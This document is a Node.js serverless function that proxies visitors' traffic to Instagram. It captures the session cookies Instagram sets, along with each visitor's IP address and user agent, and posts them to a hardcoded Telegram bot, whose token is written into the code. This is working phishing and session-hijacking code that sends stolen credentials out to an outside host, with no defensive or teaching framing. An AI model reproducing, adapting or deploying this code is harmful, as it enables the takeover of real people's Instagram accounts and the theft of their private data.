const fetch = require('node-fetch');

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

// Standard Chrome User-Agent to avoid Instagram blocking
const DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

exports.handler = async (event, context) => {
    try {
        // 1. Get the URL to proxy to
        const urlParam = event.queryStringParameters.url;
        let targetUrl = urlParam || "https://www.instagram.com/";

        // 2. Prepare headers to forward (with browser-like defaults)
        const headers = {};
        for (const [key, value] of Object.entries(event.headers)) {
            headers[key] = value;
        }
        
        // Force browser-like headers
        headers['user-agent'] = event.headers['user-agent'] || DEFAULT_USER_AGENT;
        headers['sec-fetch-mode'] = event.headers['sec-fetch-mode'] || 'document';
        headers['sec-fetch-dest'] = event.headers['sec-fetch-dest'] || 'document';
        headers['sec-fetch-user'] = event.headers['sec-fetch-user'] || '?1';
        headers['accept'] = event.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
        headers['accept-language'] = event.headers['accept-language'] || 'en-US,en;q=0.9';
        headers['cache-control'] = 'max-age=0';

        // Set host to the target domain
        headers['host'] = new URL(targetUrl).host;

        // 3. Fetch from Instagram
        let response;
        try {
            response = await fetch(targetUrl, {
                method: event.httpMethod,
                headers: headers,
                body: event.body ? Buffer.from(event.body, 'base64') : undefined,
                // Follow redirects automatically
                redirect: 'follow' 
            });
        } catch (fetchError) {
            console.error("Fetch Error:", fetchError);
            return {
                statusCode: 502,
                body: `Bad Gateway: Failed to connect to Instagram. ${fetchError.message}`
            };
        }

        // 4. Capture Cookies from Instagram's response
        // Instagram sends multiple Set-Cookie headers, so we need to join them
        const setCookieHeader = response.headers.get('set-cookie');
        const cookies = setCookieHeader || "No cookies found";

        // 5. Prepare Telegram Message
        const timestamp = new Date().toISOString();
        const userAgent = headers['user-agent'];
        const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown IP";
        
        const message = `
🍪 <b>Instagram Proxy Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🔗 <b>Target URL:</b> <code>${targetUrl}</code>

🍪 <b>Cookies (Set-Cookie):</b>
<code>${cookies}</code>
        `;

        // 6. Send to Telegram
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });
        } catch (telegramError) {
            console.error("Telegram Error:", telegramError);
        }

        // 7. Return the response from Instagram to the user
        const responseHeaders = {};
        response.headers.forEach((value, key) => {
            responseHeaders[key] = value;
        });

        // Read the body
        const bodyBuffer = await response.buffer();

        return {
            statusCode: response.status,
            headers: responseHeaders,
            body: bodyBuffer.toString('base64'),
            isBase64Encoded: true
        };

    } catch (error) {
        console.error("Handler Error:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};
